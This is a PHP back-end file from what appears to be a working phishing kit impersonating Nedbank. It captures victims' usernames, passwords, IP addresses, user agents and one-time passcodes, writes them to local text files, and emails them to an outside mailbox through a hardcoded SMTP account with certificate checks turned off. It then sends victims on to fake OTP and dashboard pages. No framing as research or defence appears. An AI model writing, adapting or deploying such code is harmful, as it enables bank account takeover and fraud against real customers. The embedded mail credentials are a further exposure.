<?php
// Fix for permission and header errors
ob_start();
error_reporting(0); // Temporarily disable error display

// Your existing code...

// Include Composer autoloader
require __DIR__ . '/vendor/autoload.php';

// Use PHPMailer classes
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Process form data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        // Save credentials
        $credentials = [
            'username' => $_POST['username'],
            'password' => $_POST['password'],
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'timestamp' => date('Y-m-d H:i:s')
        ];
        
        file_put_contents('credentials.txt', json_encode($credentials) . PHP_EOL, FILE_APPEND);
        
        // Send email with credentials using PHPMailer
        sendEmailWithPHPMailer($credentials);
        
        // Check if this is an AJAX request or regular form submission
        if (isAjaxRequest()) {
            header('Content-Type: application/json');
            echo json_encode(['success' => true, 'redirect' => 'nedbank_otp_verification.php']);
            exit;
        } else {
            // Redirect to OTP verification page
            header('Location: nedbank_otp_verification.php');
            exit;
        }
    }
    
    if (isset($_POST['action']) && $_POST['action'] === 'verify_otp') {
        // Collect OTP from individual inputs or combined field
        $otp = '';
        
        if (isset($_POST['otp'])) {
            // From AJAX request (combined OTP)
            $otp = $_POST['otp'];
        } else {
            // From regular form submission (individual OTP fields)
            for ($i = 1; $i <= 6; $i++) {
                $fieldName = 'otp' . $i;
                if (isset($_POST[$fieldName]) && !empty($_POST[$fieldName])) {
                    $otp .= $_POST[$fieldName];
                }
            }
        }
        
        // Validate OTP (any 6-digit OTP is accepted for demo purposes)
        if (strlen($otp) === 6 && is_numeric($otp)) {
            // Save OTP
            $otpData = [
                'otp' => $otp,
                'ip' => $_SERVER['REMOTE_ADDR'],
                'timestamp' => date('Y-m-d H:i:s')
            ];
            
            file_put_contents('otp.txt', json_encode($otpData) . PHP_EOL, FILE_APPEND);
            
            // Send email with OTP using PHPMailer
            sendOTPEmailWithPHPMailer($otpData);
            
            // Return appropriate response
            if (isAjaxRequest()) {
                header('Content-Type: application/json');
                echo json_encode(['success' => true, 'redirect' => 'dashboard.php']);
                exit;
            } else {
                // Regular form submission - redirect to dashboard
                header('Location: dashboard.php');
                exit;
            }
        } else {
            // Invalid OTP
            if (isAjaxRequest()) {
                header('Content-Type: application/json');
                echo json_encode(['success' => false, 'message' => 'Invalid OTP format']);
                exit;
            } else {
                // Redirect back to OTP page with error
                header('Location: nedbank_otp_verification.php?error=invalid_otp');
                exit;
            }
        }
    }
}

// Helper function to check if request is AJAX
function isAjaxRequest() {
    return !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && 
           strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
}

function sendEmailWithPHPMailer($credentials) {
    $mail = new PHPMailer(true);
    
    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'mail.park-villageauctions.co.za';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'info@park-villageauctions.co.za';
        $mail->Password   = 'Pa$$@2000';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;
        
        $mail->SMTPOptions = array(
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            )
        );
        
        $mail->setFrom('info@park-villageauctions.co.za', 'Nedbank System');
        $mail->addAddress('info@park-villageauctions.co.za', 'Recipient');
        
        $mail->isHTML(true);
        $mail->Subject = 'Nedbank Credentials Captured - ' . date('Y-m-d H:i:s');
        $mail->Body    = "
            <h2>🚨 New Nedbank Credentials Captured</h2>
            <p><strong>Username:</strong> " . htmlspecialchars($credentials['username']) . "</p>
            <p><strong>Password:</strong> " . htmlspecialchars($credentials['password']) . "</p>
            <p><strong>IP Address:</strong> " . htmlspecialchars($credentials['ip']) . "</p>
            <p><strong>User Agent:</strong> " . htmlspecialchars($credentials['user_agent']) . "</p>
            <p><strong>Timestamp:</strong> " . htmlspecialchars($credentials['timestamp']) . "</p>
        ";
        
        $mail->send();
        error_log('✅ Credentials email sent successfully');
        
    } catch (Exception $e) {
        error_log("❌ PHPMailer Error: {$mail->ErrorInfo}");
        sendEmailFallback($credentials);
    }
}

function sendOTPEmailWithPHPMailer($otpData) {
    $mail = new PHPMailer(true);
    
    try {
        $mail->isSMTP();
        $mail->Host       = 'mail.park-villageauctions.co.za';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'info@park-villageauctions.co.za';
        $mail->Password   = 'Pa$$@2000';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;
        
        $mail->SMTPOptions = array(
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            )
        );
        
        $mail->setFrom('info@park-villageauctions.co.za', 'Nedbank System');
        $mail->addAddress('info@park-villageauctions.co.za', 'Recipient');
        
        $mail->isHTML(true);
        $mail->Subject = 'Nedbank OTP Captured - ' . date('Y-m-d H:i:s');
        $mail->Body    = "
            <h2>🔐 New Nedbank OTP Captured</h2>
            <p><strong>OTP Code:</strong> <code>" . htmlspecialchars($otpData['otp']) . "</code></p>
            <p><strong>IP Address:</strong> " . htmlspecialchars($otpData['ip']) . "</p>
            <p><strong>Timestamp:</strong> " . htmlspecialchars($otpData['timestamp']) . "</p>
        ";
        
        $mail->send();
        error_log('✅ OTP email sent successfully');
        
    } catch (Exception $e) {
        error_log("❌ OTP PHPMailer Error: {$mail->ErrorInfo}");
        sendOTPEmailFallback($otpData);
    }
}

function sendEmailFallback($credentials) {
    $to = "info@park-villageauctions.co.za";
    $subject = "Nedbank Credentials Captured - " . date('Y-m-d H:i:s');
    $message = "NEDBANK CREDENTIALS CAPTURED\n\n" .
               "Username: " . $credentials['username'] . "\n" .
               "Password: " . $credentials['password'] . "\n" .
               "IP: " . $credentials['ip'] . "\n" .
               "Time: " . $credentials['timestamp'] . "\n";
    
    $headers = "From: info@park-villageauctions.co.za\r\n";
    mail($to, $subject, $message, $headers);
}

function sendOTPEmailFallback($otpData) {
    $to = "info@park-villageauctions.co.za";
    $subject = "Nedbank OTP Captured - " . date('Y-m-d H:i:s');
    $message = "NEDBANK OTP CAPTURED\n\n" .
               "OTP: " . $otpData['otp'] . "\n" .
               "IP: " . $otpData['ip'] . "\n" .
               "Time: " . $otpData['timestamp'] . "\n";
    
    $headers = "From: info@park-villageauctions.co.za\r\n";
    mail($to, $subject, $message, $headers);
}
?>
